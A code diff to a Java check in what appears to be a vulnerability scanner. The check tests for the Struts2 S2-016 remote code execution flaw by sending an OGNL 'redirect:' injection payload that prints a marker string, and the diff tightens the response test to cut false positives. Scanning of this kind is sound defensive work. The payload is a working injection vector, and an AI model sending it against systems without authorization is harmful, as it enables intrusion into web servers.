@@ -38,14 +38,15 @@ public class Struts2RCE016 extends WebScriptBase {
 	public void prove() {
 		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
 		String provePayload = "redirect:${#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println('The Struts2-016 Remote Code Execution Is Exist!'),#w.flush(),#w.close()}";
-		String proveFlag = "The Struts2-016 Remote Code Execution Is Exist!";
+		String proveFlag1 = "The Struts2-016 Remote Code Execution Is Exist!";
+		String proveFlag2 = "com.opensymphony.xwork2.dispatcher.HttpServletResponse";
 		String result = "";
 
 		result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(provePayload).replace("+","%20")));
 		if (result==null) {
 			result = Message.notAvailable;
 			getVulnerBean().setIsVulner(Permeate.isNotVerified);
-		}else if(result.indexOf(proveFlag)>=0){
+		}else if(result.indexOf(proveFlag1)>=0&&result.indexOf(proveFlag2)<0){
 			getVulnerBean().setIsVulner(Permeate.isVulner);
 		}
 		else{
